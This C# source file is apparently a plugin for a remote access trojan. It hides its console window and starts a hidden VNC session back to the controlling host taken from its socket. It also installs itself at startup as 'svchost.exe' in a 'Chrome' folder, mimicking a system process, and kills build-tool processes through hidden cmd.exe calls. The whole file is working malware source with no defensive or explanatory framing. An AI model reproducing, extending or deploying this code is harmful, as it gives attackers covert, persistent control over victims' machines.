using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Plugin
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;

        public static void Install(string PORT, string MUTEX)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            var host = Plugin.Socket.RemoteEndPoint.ToString();
            var index = host.LastIndexOf(":");
            if (index > 0)
                host = host.Substring(0, index);
            var IPDNS = host;
            var porthex = Convert.ToString(PORT);
            string STARTUP = "True";
            string PATH = "1";
            string FOLDER = "Chrome";
            string FILENAME = "svchost.exe";
            string WDEX = "";
            string ID = "Pegasus";
            KillHVNC("MSBuild");
            KillHVNC("cvtres");
            HVNC.StartHVNC(IPDNS + " " + porthex, ID, MUTEX);
            if (STARTUP == "True")
            {
                Installer.Run(PATH, FOLDER, FILENAME, WDEX);
            }
        }
        public static void StartProcess(string processx)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe",
                Arguments = string.Format("/c " + processx)
            };
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
        }

        public static void KillHVNC(string proc)
        {
            List<int> list = new List<int>();
            Process[] processesByName = Process.GetProcessesByName(proc);
            foreach (Process process in processesByName)
            {
                list.Add(process.Id);
            }
            StartProcess("taskkill /F /IM " + proc + ".exe");
            StartProcess("taskkill /PID " + list.Max() + " /F ");
        }
    }

}

